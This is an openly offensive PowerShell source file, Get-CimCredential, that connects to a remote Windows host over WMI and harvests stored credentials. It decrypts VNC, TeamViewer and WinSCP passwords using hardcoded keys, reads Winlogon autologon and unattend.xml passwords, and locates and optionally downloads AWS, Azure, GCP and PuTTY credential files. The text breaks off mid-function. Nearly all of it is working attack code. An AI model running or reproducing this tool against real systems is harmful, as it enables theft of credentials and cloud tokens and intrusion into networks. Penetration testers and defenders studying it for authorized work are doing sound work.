#requires -version 3

Function Get-CimCredential {
<#
.SYNOPSIS
    Grab credentials stored on a remote computer.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CimCredential enumerates registry keys and files containing credentials on a remote host through WMI.
    Credential files can be optionally downloaded via SMB or PowerShell Remoting.
    Gathered credentials include autologon, unattended files, VNC, TeamViewer (CVE-2018-14333), WinSCP, PuTTY, mRemoteNG, Apache Directory Studio, AWS, Azure, Google Cloud Plateform, Bluemix.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Authentication
    Specifies what authentication method should be used.

.PARAMETER Protocol
    Specifies the protocol to use, defaults to DCOM.

.PARAMETER DownloadFiles
    Enables file download.

.EXAMPLE
    PS C:\> Get-CimCredential -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -DownloadFiles
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
        [String]
        $Authentication = 'Default',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [Switch]
        $DownloadFiles
    )

    Begin {
        # Optionally check host reachability
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            continue
        }

        # Init variables
        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        $formatDefaultLimit = $global:FormatEnumerationLimit
    }

    Process {
        # Prevent output truncation
        $global:FormatEnumerationLimit = -1

        # Init remote sessions
        try {
            if (-not $PSBoundParameters['ComputerName']) {
                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($DownloadFiles -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            elseif ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($DownloadFiles -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if ($DownloadFiles -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
        }
        catch [Management.Automation.PSArgumentOutOfRangeException] {
            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
            return
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
                return
            }
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Verbose "[$ComputerName] Access denied."
                return
            }
            else {
                Write-Verbose "[$ComputerName] Failed to establish CIM session."
                return
            }
        }
        catch [Management.Automation.Remoting.PSRemotingTransportException] {
            Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
            return
        }

        # Process common registry keys
        Get-WinlogonCredentialRegistry -CimSession $cimSession
        Get-VncCredentialRegistry -CimSession $cimSession
        Get-TeamViewerCredentialRegistry -CimSession $cimSession

        # Process user registry keys
        [uint32]$HKU = 2147483651
        $SIDs = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=''} -CimSession $cimSession -Verbose:$false | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
        foreach ($SID in $SIDs) {
            Get-VncCredentialRegistry -CimSession $cimSession -SID $SID
            Get-TeamViewerCredentialRegistry -CimSession $cimSession -SID $SID
            Get-WinScpCredentialRegistry -CimSession $cimSession -SID $SID
            Get-PuttyCredentialRegistry -CimSession $cimSession -SID $SID -DownloadFiles:$DownloadFiles -Credential $Credential -PSSession $psSession
        }

        # Process common files
        Get-UnattendCredentialFile -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
        Get-VncCredentialFile -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession

        # Process user files
        $userFiles = @{
            # Cloud credentials
            "AWS-KeyFile"               = "\.aws\credentials"
            "Azure-Tokens"              = "\.azure\accessTokens.json"
            "Azure-Profile"             = "\.azure\azureProfile.json"
            "Azure-TokenCache"          = "\.azure\TokenCache.dat"
            "Azure-TokenCache2"         = "\AppData\Roaming\Windows Azure Powershell\TokenCache.dat"
            "Azure-RMContext"           = "\.azure\AzureRMContext.json"
            "Azure-RMContext2"          = "\AppData\Roaming\Windows Azure Powershell\AzureRMContext.json"
            "GCP-LegacyCreds"           = "\AppData\Roaming\gcloud\legacy_credentials"
            "GCP-CredsDb"               = "\AppData\Roaming\gcloud\credentials.db"
            "GCP-AccessTokensDb"        = "\AppData\Roaming\gcloud\access_tokens.db"
            "Bluemix-Config"            = "\.bluemix\config.json"
            "Bluemix-Config2"           = "\.bluemix\.cf\config.json"
            # Sessions
            "MTPuTTy"                   = "\AppData\Roaming\TTYPlus\mtputty.xml"
        }
        Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
            $profilePath = $_.LocalPath
            Get-FilezillaCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
            Get-MRNGCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
            Get-ApacheDirectoryStudioCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession

            foreach ($userFile in $userFiles.GetEnumerator()) {
                $filePath = ($profilePath + $userFile.Value).Replace('\','\\')
                $filter  = "Name='$filePath'"
                $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter $filter -CimSession $cimSession -Verbose:$false
                if ($file.Name) {
                    $result = New-Object -TypeName PSObject
                    $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                    $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value $userFile.Key
                    $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
                    $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                    $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
                    Write-Output $result
                    if ($DownloadFiles) {
                        $outputDir = "$PWD\$ComputerName"
                        $temp = $profilePath -split "\\"
                        $outputFile = "$outputDir\$($temp.get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                        New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                        if ($psSession) {
                            Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
                        }
                        else {
                            Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                        }
                    }
                }
            }
        }
    }

    End {
        # End remote sessions
        if ($cimSession) {
            Remove-CimSession -CimSession $cimSession
        }
        if ($psSession) {
            Remove-PSSession -Session $psSession
        }
        # Restore output limit
        $global:FormatEnumerationLimit = $formatDefaultLimit
    }
}

Function Local:Get-WinlogonCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession
    )

    [uint32]$HKLM = 2147483650
    $location = "SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

    if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
        $creds = New-Object -TypeName psobject
        if ($domain = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultDomainName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Domain' -Value $domain
        }
        if ($username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultUserName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
        }
        $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
        $result = New-Object -TypeName psobject
        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
        $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value ''
        $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value ''
        Write-Output $result
    }

    if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='AltDefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
        $creds = New-Object -TypeName psobject
        if ($domain = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultDomainName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Domain' -Value $domain
        }
        if ($username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultUserName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
        }
        $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
        $result = New-Object -TypeName psobject
        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
        $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value ''
        $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value ''
        Write-Output $result
    }
}

Function Local:Get-VncCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [String]
        $SID
    )

    Begin {
        Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
            if ($EncryptedPassword.Length -lt 8) {
                return ""
            }
            [byte[]] $seed = (23, 82, 107, 6, 35, 78, 88, 7)
            $key = New-Object byte[] $seed.Length
            for ($i = 0; $i -lt 8; $i++) {
                $key[$i] = (
                    (($seed[$i] -band 0x01) -shl 7) -bor
                    (($seed[$i] -band 0x02) -shl 5) -bor
                    (($seed[$i] -band 0x04) -shl 3) -bor
                    (($seed[$i] -band 0x08) -shl 1) -bor
                    (($seed[$i] -band 0x10) -shr 1) -bor
                    (($seed[$i] -band 0x20) -shr 3) -bor
                    (($seed[$i] -band 0x40) -shr 5) -bor
                    (($seed[$i] -band 0x80) -shr 7)
                )
            }
            $des = New-Object Security.Cryptography.DESCryptoServiceProvider
            $des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
            return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
        }

        Function Local:HexStringToByteArray ([string] $HexString) {    
            $byteArray = New-Object Byte[] ($HexString.Length/2);
            for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
            }
            return @( ,$byteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $commonKeys = @(
            "SOFTWARE\RealVNC\WinVNC4"
            "SOFTWARE\RealVNC\vncserver"
            "SOFTWARE\RealVNC\Default"
            "SOFTWARE\Wow6432Node\RealVNC\WinVNC4"
            "SOFTWARE\TigerVNC\WinVNC4"
            "SOFTWARE\TightVNC\Server"
            "SOFTWARE\ORL\WinVNC3"
            "SOFTWARE\ORL\WinVNC3\Default"
            "SOFTWARE\ORL\WinVNC\Default"
        )

        [uint32]$HKLM = 2147483650
        [uint32]$HKU = 2147483651
        $hive = $HKLM
        foreach ($location in $commonKeys) {
            if ($SID) {
                $location = "$SID\$location"
                $hive = $HKU
            }
            if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).uValue) {
                $creds = New-Object -TypeName psobject
                $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword($password))
                $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="PortNumber"} -CimSession $cimSession -Verbose:$false).uValue
                if(-not $port) {
                    $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="RfbPort"} -CimSession $cimSession -Verbose:$false).uValue
                }
                $creds | Add-Member -MemberType NoteProperty -Name 'Port' -Value $port
                if ($viewOnlyPassword = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="PasswordViewOnly"} -CimSession $cimSession -Verbose:$false).uValue) {
                    $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($viewOnlyPassword)))
                }
                if ($controlPassword = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="ControlPassword"} -CimSession $cimSession -Verbose:$false).uValue) {
                    $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($controlPassword)))
                }
                $result = New-Object -TypeName psobject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value ''
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value ''
                Write-Output $result
            }
        }
    }

    End {}
}

Function Local:Get-TeamViewerCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [String]
        $SID
    )

    Begin {
        Function Local:Create-AesManagedObject() {
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            $aesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
            $aesManaged.Padding = [Security.Cryptography.PaddingMode]::Zeros
            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 128
            $aesManaged.IV = 0x01,0x00,0x01,0x00,0x67,0x24,0x4f,0x43,0x6e,0x67,0x62,0xf2,0x5e,0xa8,0xd7,0x04
            $aesManaged.KEY = 0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00
            return $aesManaged
        }

        Function Local:Get-TeamViewerDecryptedPassword($encryptedBytes) {
            $aesManaged = Create-AesManagedObject
            $decryptor = $aesManaged.CreateDecryptor()
            $unencryptedData = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
            $aesManaged.Dispose()
            return [Text.Encoding]::UTF8.GetString($unencryptedData)
        }

        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $commonKeys = @(
            "SOFTWARE\TeamViewer"
            "SOFTWARE\WOW6432Node\TeamViewer"
        )

        $commonValues = @(
            "LicenseKeyAES"
            "OptionsPasswordAES"
            "PermanentPassword"
            "ProxyPasswordAES"
            "ServerPasswordAES"
            "SecurityPasswordAES"
            "SecurityPasswordExported"
        )

        [uint32]$HKLM = 2147483650
        [uint32]$HKU = 2147483651
        $hive = $HKLM

        foreach ($location in $commonKeys) {
            if ($SID) {
                $location = "$SID\$location"
                $hive = $HKU
            }
            $subKeys = Invoke-CimMethod -Namespace 'root/default' -ClassName 'StdRegProv' -MethodName 'EnumKey' -Arguments @{hDefKey=$hive; sSubKeyName=$location} -CimSession $cimSession -Verbose:$false
            foreach ($keyName in $subKeys.sNames) {
                $commonKeys += "$location\$keyName".Trim('\')
            }
        }

        foreach ($location in $commonKeys) {
            if ($SID) {
                $location = "$SID\$location"
                $hive = $HKU
            }

            $creds = New-Object -TypeName psobject
            $success = $False
            foreach ($valueName in $commonValues) {
                if ($value = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName=$valueName} -CimSession $cimSession -Verbose:$false).uValue) {
                    $creds | Add-Member -MemberType NoteProperty -Name $valueName -Value (Get-TeamViewerDecryptedPassword($value))
                    $success = $True
                }
            }
            if ($success) {
                $settingValues = @(
                    "BuddyLoginName"
                    "OwningManagerAccountName"
                    "Proxy_IP"
                    "ProxyUsername"
                )
                foreach ($valueName in $commonValues) {
                    if ($value = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName=$valueName} -CimSession $cimSession -Verbose:$false).sValue) {
                        $creds | Add-Member -MemberType NoteProperty -Name $valueName -Value $value
                    }
                }

                $result = New-Object -TypeName psobject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'TeamViewer'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value ''
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value ''
                Write-Output $result
            }
        }
    }

    End {}
}

Function Local:Get-WinScpCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Parameter(Mandatory = $True)]
        [String]
        $SID
    )

    Begin {
        Function Local:Get-WinSCPDecryptedPassword($SessionHostname, $SessionUsername, $Password) {
            $CheckFlag = 255
            $Magic = 163
            $len = 0
            $key =  $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP($Password)
            $storedFlag = $values.flag 
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP($values.remainingPass)
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP($values.remainingPass)
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i=0; $i -lt $len; $i++) {
                $values = (DecryptNextCharacterWinSCP($values.remainingPass))
                $finalOutput += [char]$values.flag
            }
            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.length)
            }
            return $finalOutput
        }

        Function Local:DecryptNextCharacterWinSCP($remainingPass) {
            # Creates an object with flag and remainingPass properties
            $flagAndPass = "" | Select-Object -Property flag,remainingPass
            # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }

        $ComputerName = $CimSession.ComputerName
    }

    Process {
        [uint32]$HKU = 2147483651
        $regKey = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
        if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
            $sessions = $sessions | Select-Object -ExpandProperty sNames
            foreach ($session in $sessions) {
                $location = "$regKey\$session"
                $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
                $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
                $password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).sValue
                if ($password) {
                    $key = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security"
                    $masterPassUsed = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWordValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$key; sValueName="UseMasterPassword"} -CimSession $cimSession -Verbose:$false).uValue
                    if (!$masterPassUsed) {
                        $password = (Get-WinSCPDecryptedPassword $hostname $username $password)
                        $result = New-Object -TypeName psobject
                        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinSCP'
                        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value ([pscustomobject]@{Hostname=$hostname; Username=$username; Password=$password})
                        $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value ''
                        $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value ''
                        Write-Output $result
                    }
                }
            }
        }
    }

    End {}
}

Function Local:Get-PuttyCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Parameter(Mandatory = $True)]
        [String]
        $SID,

        [Switch]
        $DownloadFiles,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        $ComputerName = $CimSession.ComputerName
    }

    Process {
        [uint32]$HKU = 2147483651
        $regKey = $SID + "\SOFTWARE\SimonTatham\PuTTY\Sessions"
        $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
        if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
            $sessions = $sessions | Select-Object -ExpandProperty sNames
            foreach ($session in $sessions) {
                $location = "$regKey\$session"
                if ($keyFile = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PublicKeyFile"} -CimSession $cimSession -Verbose:$false).sValue) {
                    $filePath = $keyFile.Replace('\','\\')
                    $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$filePath'" -CimSession $cimSession -Verbose:$false
                    if ($file.Name) {
                        $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
                        $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PortNumber"} -CimSession $cimSession -Verbose:$false).uValue
                        $protocol = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Protocol"} -CimSession $cimSession -Verbose:$false).sValue
                        $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
                        if (-not $username -and $protocol -eq 'rlogin') {
                            $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="LocalUserName"} -CimSession $cimSession -Verbose:$false).sValue
                        }
                        $result = New-Object -TypeName psobject
                        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'PuTTY'
                        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value ([pscustomobject]@{Hostname=$hostname; Port=$port; Protocol=$protocol; Username=$username; KeyFile=$keyFile})
                        $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                        $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
                        Write-Output $result
                        if ($DownloadFiles) {
                            $outputDir = "$PWD\$ComputerName"
                            $outputFile = "$outputDir\$($SID)_$(Split-Path -Path $keyFile -Leaf)"
                            New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                            if ($PSSession) {
                                Get-RemoteFile -Path $keyFile -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                            }
                            else {
                                Get-RemoteFile -Path $keyFile -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                            }
                        }
                    }
                }
            }
        }
    }

    End {}
}

Function Local:Get-UnattendCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        # Adapted from PrivescCheck's Get-UnattendSensitiveData by @itm4n
        Function Local:Get-UnattendSensitiveData {
            Param (
                [Parameter(Mandatory=$true)]
                [String]$Path
            )

            Function Local:Get-DecodedPassword {
                Param (
                    [Object]$XmlNode
                )

                if ($XmlNode.GetType().Name -eq "string") {
                    $XmlNode
                }
                else {
                    if ($XmlNode) {
                        if ($XmlNode.PlainText -eq "false") {
                            [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($XmlNode.Value))
                        }
                        else {
                            $XmlNode.Value
                        }
                    }
                }
            }

            [xml] $xml = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError
            if (-not $GetContentError) {
                $xml.GetElementsByTagName("Credentials") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_.Password
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        Write-Output $result
                    }
                }

                $xml.GetElementsByTagName("LocalAccount") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_.Password
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "LocalAccount"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Name
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        Write-Output $result
                    }
                }

                $xml.GetElementsByTagName("AutoLogon") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_.Password
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AutoLogon"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        Write-Output $result
                    }
                }

                $xml.GetElementsByTagName("AdministratorPassword") | ForEach-Object {
                    $password = Get-DecodedPassword -XmlNode $_
                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AdministratorPassword"
